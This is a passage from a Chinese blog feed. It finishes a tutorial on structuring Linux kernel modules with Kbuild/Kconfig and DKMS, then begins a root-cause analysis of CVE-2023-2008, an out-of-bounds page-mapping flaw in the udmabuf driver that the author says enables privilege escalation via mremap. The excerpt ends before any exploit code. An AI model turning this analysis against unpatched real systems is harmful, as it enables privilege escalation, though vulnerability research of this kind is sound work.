class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += sub/sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += -DCONFIG_ENABLE_SUB<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><p>我们将 <code>src/main.c</code> 修改如下，以判定是否引入对应函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello kernel world!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    foo_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>对于  <code>src/sub/sub_sub/Kbuild</code>  我们同样进行这样的修改：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += sub/sub_sub/sub_sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += -DCONFIG_ENABLE_SUB_SUB<br></code></pre></td></tr></table></figure><p>我们将 <code>src/sub/sub.c</code> 修改为如下，以判定是否引入该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    foo_sub_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br> <br></code></pre></td></tr></table></figure><p>编译载入，可以看到确实没有调用二级目录的 <code>foo_sub_sub()</code> 函数：</p><p><img src="https://s2.loli.net/2025/02/25/B4aQLRM29JiyhZt.png"></p><p>重新配置 <code>.config</code> ，开启 <code>CONFIG_ENANLE_SUB_SUB</code> 选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># First-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Second-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB_SUB=y<br><span class="hljs-comment"># end of Second-level sub directory</span><br><span class="hljs-comment"># end of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>重新编译载入，可以看到二级目录的 <code>foo_sub_sub()</code> 函数被引入并调用：</p><p><img src="https://s2.loli.net/2025/02/25/MCDp6dn4ZyAuOvk.png"></p><p>灵活使用 Kbuild 与 Kconfig，我们便能比较优雅地编写一个内核模块：）</p><h1 id="0x02-使用-DKMS-为开源内核模块添加自动升级"><a href="#0x02-使用-DKMS-为开源内核模块添加自动升级" class="headerlink" title="0x02. 使用 DKMS 为开源内核模块添加自动升级"></a>0x02. 使用 DKMS 为开源内核模块添加自动升级</h1><p>内核模块需要针对当前内核版本进行编译，而内核版本的升级不一定会带着树外的内核模块一起重编译，从而导致内核版本与模块版本的不匹配而使得内核模块无法被载入（例如过去很多 Ubuntu 用户老生常谈的 NVIDIA 显卡驱动在内核升级之后就掉了的问题）</p><blockquote><p>笔者自己是有在 Gentoo 上遇到过这个问题，安装 DKMS 之前每次编译安装完内核之后还要手动重新安装一次 NVIDIA 显卡驱动</p><blockquote><p>不过 NVIDIA 仅为开源驱动提供了 DKMS 支持，对于闭源驱动而言仍旧需要在每次升级内核后手动安装，而开源驱动目前缺少了一部分电源管理相关的模块， <em>这会使得笔者的笔记本无法正常地进行休眠</em> ，因此笔者只好继续驻留在 NVIDIA 闭源驱动上，保持每次更新内核后都重新安装 NVIDIA 闭源驱动的习惯（虽然一行 <code>emerge</code> 就解决了）……</p></blockquote></blockquote><p>由 Dell 公司开发的 <a href="http://github.com/dell/dkms">Dynamic Kernel Module System</a> 尝试通过自动化地重编译内核模块来解决这个问题，作为一个构建安装内核模块的框架，其支持通过一些钩子以在内核更新后自动检测与重编译一些内核模块并安装，同时还为用户提供了一个简易的管理界面</p><p>DKMS 对内核模块的管理过程如下图状态机所示，这实质上代表了 DKMS 支持的五个命令：</p><p><img src="https://s2.loli.net/2025/02/25/SyhlZopYNu9vHc7.png"></p><ul><li>add：将树外模块添加到树中，模块状态变为 <code>Added</code> </li><li>build：构建内核模块，模块状态变为 <code>Built</code></li><li>install：安装内核模块，模块状态变为 <code>Installed</code></li><li>uninstall：卸载内核模块，模块状态变回 <code>Built</code></li><li>remove：从树中移除内核模块，模块状态变回 <code>Not in tree</code></li></ul><h2 id="基本的-DKMS-使用与配置文件编写"><a href="#基本的-DKMS-使用与配置文件编写" class="headerlink" title="基本的 DKMS 使用与配置文件编写"></a>基本的 DKMS 使用与配置文件编写</h2><p>要使用 DKMS 管理我们的内核模块，我们首先要准备一份这样的 <code>dkms.conf</code> 文件，这里还是以我们前面的内核模块为例，变量字面含义都比较明显所以笔者这里就不再赘述了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># package information</span><br>PACKAGE_NAME=<span class="hljs-string">&quot;a3kmod&quot;</span><br>PACKAGE_VERSION=<span class="hljs-string">&quot;1.1.4&quot;</span><br><br><span class="hljs-comment"># basic configuration</span><br>AUTOINSTALL=<span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-comment"># module information</span><br>BUILT_MODULE_NAME[0]=<span class="hljs-string">&quot;$PACKAGE_NAME&quot;</span><br>BUILT_MODULE_LOCATION=<span class="hljs-string">&quot;src/&quot;</span><br><br><span class="hljs-comment"># compilation configuration</span><br>MAKE[0]=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>CLEAN=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src clean&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>DEST_MODULE_LOCATION=<span class="hljs-string">&quot;/extra&quot;</span> <span class="hljs-comment"># relative path to /lib/modules/$(shell uname -r)/</span><br></code></pre></td></tr></table></figure><p>要使用 DKMS，首先我们的内核模块源码 <strong>应当位于 &#x2F;usr&#x2F;src 目录下，且格式应当为</strong> <code>/usr/src/&lt;PACKAGE_NAME&gt;-&lt;PACKAGE_VERSION&gt;</code>，因此我们的测试模块应当放在 <code>/usr/src/a3kmod-1.1.4</code> 目录下：</p><blockquote><p>这里的 <code>.config</code> 文件你可以选择准备一份默认配置，而不需要再手动选择生成选项</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree -a /usr/src/a3kmod-1.1.4/</span><br>/usr/src/a3kmod-1.1.4/<br>├── .config<br>├── Makefile<br>├── dkms.conf<br>└── src<br>    ├── Kbuild<br>    ├── Kconfig<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 10 files<br></code></pre></td></tr></table></figure><p>接下来将我们的内核模块添加到 DKMS 追踪列表当中，从而在后续能够自动更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms add -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>Creating symlink /var/lib/dkms/a3kmod/1.1.4/source -&gt; /usr/src/a3kmod-1.1.4<br></code></pre></td></tr></table></figure><p>然后开始构建内核模块，需要注意的是在此阶段我们尚未为内核模块添加签名支持：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms build -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>The kernel is built without module signing facility, modules won&#x27;t be signed<br><br>Cleaning build area... done.<br>Building module(s)... done.<br>Cleaning build area... done.<br></code></pre></td></tr></table></figure><p>完成构建之后进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms install -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br><br>Installing /lib/modules/6.6.67-gentoo-gentoo-dist/extra/a3kmod.ko.xz<br>Running depmod.... done.<br></code></pre></td></tr></table></figure><p>此时我们的测试模块 <code>a3kmod</code> 就进入到树中了，我们可以使用 <code>dkms status</code> 命令查看 dkms 管理的内核模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms status</span><br>a3kmod/1.1.4, 6.6.67-gentoo-gentoo-dist, x86_64: installed<br></code></pre></td></tr></table></figure><p>不过此时我们的内核模块尚未装载到内核当中，我们可以像其他模块那样使用 <code>modprobe</code> 来手动地即时 <code>insmod</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe a3kmod</span><br></code></pre></td></tr></table></figure><p>简单测试一下，可以发现确实被成功载入：</p><p><img src="https://s2.loli.net/2025/02/25/A3PTexqnc9JwFyV.png"></p><blockquote><p>不过重启后我们的内核模块并不会被自动载入，因为这不属于 DKMS 的职能范围，我们若是需要这个功能，则可以在 <code>/etc/modules-load.d/</code> 中新建一个 <code>a3kmod.conf</code> 文件，并添加我们的内核模块名：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">a3kmod<br></code></pre></td></tr></table></figure><p>此时再重启便能看到我们的内核模块被自动载入了：</p><p><img src="https://s2.loli.net/2025/02/25/ocmPAKM4B6vp7qk.png"></p></blockquote><p>接下来我们测试一下内核更新后的自动编译，我们编译一个新版本的内核并安装，之后重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) bzImage &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>) modules</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make modules_install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><p>在 <code>make install</code> 的日志中我们可以看到 dkms 的输出内容（这里忘了截图了被后面的输出覆盖了），重启计算机，可以看到我们的内核模块成功地在新内核上被载入，而无需我们再手动进行编译：</p><p><img src="https://s2.loli.net/2025/02/25/7mnXGaWCN9q6lAc.png"></p><h2 id="为内核模块添加签名支持（🕊）"><a href="#为内核模块添加签名支持（🕊）" class="headerlink" title="为内核模块添加签名支持（🕊）"></a>为内核模块添加签名支持（🕊）</h2><h2 id="打包一个支持-DKMS-的内核模块的软件包（🕊）"><a href="#打包一个支持-DKMS-的内核模块的软件包（🕊）" class="headerlink" title="打包一个支持 DKMS 的内核模块的软件包（🕊）"></a>打包一个支持 DKMS 的内核模块的软件包（🕊）</h2><blockquote><p>按各大发行版要求去打成对应的格式就行，没什么好说的：）</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在 5:20 make install—— 13：14 准时 kernel panic&lt;/p&gt;</summary>
    
    
    
    <category term="DEV" scheme="https://arttnba3.github.io/categories/DEV/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x0B】CVE-2023-2008 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/"/>
    <id>https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/</id>
    <published>2024-12-31T09:34:19.000Z</published>
    <updated>2025-01-01T17:38:10.204Z</updated>
    
    <content type="html"><![CDATA[<p>Linus 哥你骗我们干嘛！这 DMA-BUF 他也不无敌啊！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2008">CVE-2023-2008</a> 是一个发生在 Linux 内核的 <a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf 子系统</a> 的 <code>/dev/udmabuf</code> 设备驱动中的一个漏洞，由于缺乏对范围扩张后的 <code>udmabuf::pages</code> 的边界检查，导致攻击者可以完成越界页面指针映射，从而完成越权文件写入攻击以进行提权；该漏洞影响版本为 <code>4.20 ~ 5.4.201</code> 、<code>5.5 ~ 5.10.126</code> 、<code>5.11~5.15.50</code>、<code>5.16 ~ 5.18.7</code> ，本文我们选用 <code>5.11</code> 版本的内核源码进行分析</p><p>在开始之前，请先在 <a href="https://arttnba3.cn/2024/11/30/OS-0X06-LINUX-DMABUF/">这篇博客</a> 当中补充一些 dma-buf 与 udmabuf 的基础知识</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>在 <code>udmabuf</code> 驱动当中，<code>udmabuf</code> 结构体被用以表示一份与一个 <code>DMA-BUF</code> 绑定的共享内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> &#123;</span><br><span class="hljs-type">pgoff_t</span> pagecount;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/31/RQylzJUsh8tNSFM.png"></p><p>众所周知 <code>dma_buf</code> 内存在用户态一般通过 <code>mmap()</code> 访问，当我们第一次读写 <code>mmap()</code> 的 <code>udmabuf</code> 所给的 <code>dma_buf</code> 的内存时，会触发缺页异常以分配内存页，因为在创建 <code>dma_buf</code> 时有如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ksys_ioctl</span>()<br><span class="hljs-built_in">do_vfs_ioctl</span>()<br><span class="hljs-built_in">vfs_ioctl</span>()<br>filp-&gt;f_op-&gt;<span class="hljs-built_in">unlocked_ioctl</span>()<span class="hljs-comment">/* udmabuf_misc.fops = &amp;udmabuf_fops */</span><br><span class="hljs-built_in">udmabuf_ioctl</span>()<br><span class="hljs-built_in">udmabuf_ioctl_create</span>()<span class="hljs-comment">/* 或者 list */</span><br><span class="hljs-built_in">udmabuf_create</span>()<br></code></pre></td></tr></table></figure><p>在 <code>udmabuf_create()</code> 中会初始化 <code>dma_buf</code> 的函数表为 <code>udmabuf_ops</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">udmabuf_ops</span> =</span> &#123;<br>.map_dma_buf  = map_udmabuf,<br>.unmap_dma_buf  = unmap_udmabuf,<br>.release  = release_udmabuf,<br>.<span class="hljs-built_in">map</span>  = kmap_udmabuf,<br>.unmap  = kunmap_udmabuf,<br>.mmap  = mmap_udmabuf,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_create</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_list *head,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_item *<span class="hljs-built_in">list</span>)</span><br>&#123;<br>DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br><br><span class="hljs-comment">/* ... */</span><br><br>exp_info.ops  = &amp;udmabuf_ops;<br>exp_info.size = ubuf-&gt;pagecount &lt;&lt; PAGE_SHIFT;<br>exp_info.priv = ubuf;<br>exp_info.flags = O_RDWR;<br></code></pre></td></tr></table></figure><p>在 <code>mmap_udmabuf()</code> 当中为 mmap 对应的 <code>vm_area_struct</code> 配置了函数表 <code>udmabuf_vm_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> <span class="hljs-title">udmabuf_vm_ops</span> =</span> &#123;<br>.fault = udmabuf_vm_fault,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mmap_udmabuf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> buf-&gt;priv;<br><br><span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_SHARED | VM_MAYSHARE)) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>vma-&gt;vm_ops = &amp;udmabuf_vm_ops;<br>vma-&gt;vm_private_data = ubuf;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此在缺页异常时最终会调用到 <code>udmabuf_vm_fault()</code> 函数，从 <code>udmabuf::pages</code> 中取出对应的内存页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">udmabuf_vm_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> vma-&gt;vm_private_data;<br><br>vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];<br>get_page(vmf-&gt;page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到 <code>udmabuf_vm_fault()</code> 函数并未对 <code>vmf-&gt;pgoff</code> 的大小进行检查，这是因为  <code>dma-buf</code> 的 <code>mmap()</code> 路径会调用到 <code>dma_buf_mmap_internal()</code> ，在其中会先进行范围检查后再调用 <code>dmabuf-&gt;ops-&gt;mmap()</code> ，因此在 <em>正常读写</em> 的情况下并不会超出 <code>udmabuf::pages</code> 的范围：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dma_buf_mmap_internal</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br><br><span class="hljs-keyword">if</span> (!is_dma_buf_file(file))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>dmabuf = file-&gt;private_data;<br><br><span class="hljs-comment">/* check if buffer supports mmap */</span><br><span class="hljs-keyword">if</span> (!dmabuf-&gt;ops-&gt;mmap)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* check for overflowing the buffer&#x27;s size */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_pgoff + vma_pages(vma) &gt;<br>    dmabuf-&gt;size &gt;&gt; PAGE_SHIFT)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">return</span> dmabuf-&gt;ops-&gt;mmap(dmabuf, vma);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">dma_buf_fops</span> =</span> &#123;<br><span class="hljs-comment">/* ... */</span><br>.mmap= dma_buf_mmap_internal,<br></code></pre></td></tr></table></figure><p>但这存在一个问题—— <code>mmap()</code> 所映射的区域是可以被扩展（expand）和收缩（shrink）的，这一般可以通过 <code>mremap()</code> 系统调用完成：</p><p><img src="https://s2.loli.net/2024/12/31/dctSPxWrJYBufqV.png"></p><p><code>mremap()</code> 可以改变一个 <code>vm_area_struct</code> 的地址空间大小，而这个功能默认开启，若要限制则需要在 mmap 时为 <code>vm_area_struct::vm_flags</code> 添加 <code>VM_DONTEXPAND</code> 标志位</p><blockquote><p>以 <code>kcov_mmap()</code> 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">kcov_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-comment">/* ... */</span><br>vma-&gt;vm_flags |= VM_DONTEXPAND;<br></code></pre></td></tr></table></figure></blockquote><p>而 